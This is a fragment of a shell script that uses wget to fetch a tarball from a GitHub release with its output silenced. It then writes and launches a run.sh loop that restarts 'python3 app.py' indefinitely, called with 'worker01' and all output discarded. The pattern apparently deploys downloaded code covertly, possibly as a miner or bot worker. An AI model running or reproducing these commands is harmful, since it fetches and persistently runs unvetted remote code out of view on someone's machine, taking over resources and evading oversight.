...
wget https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
...
while true; do
  python3 app.py
  sleep 15
done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 3 worker01 >/dev/null 2>&1
